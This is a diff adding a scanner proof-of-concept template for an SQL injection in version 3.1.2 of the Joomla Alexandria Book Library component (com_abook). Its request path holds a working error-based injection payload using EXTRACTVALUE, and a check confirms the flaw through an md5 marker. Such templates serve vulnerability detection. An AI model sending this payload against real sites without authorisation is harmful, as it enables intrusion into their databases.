@@ -1,0 +1,13 @@
+name: poc-yaml-joomla-component-alexandria-book-library-sql
+set:
+  r1: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: /index.php?option=com_abook&view=category&letter=D' AND EXTRACTVALUE(22,CONCAT(0x5c,version(),(SELECT (ELT(1=1,1))),md5({{r1}})))-- VerAyari
+    expression: |
+      response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+detail:
+  author: 南方有梦(http://github.com/hackgov)
+  Affected Version: "3.1.2"
+  links:
+    - https://www.exploit-db.com/exploits/44162
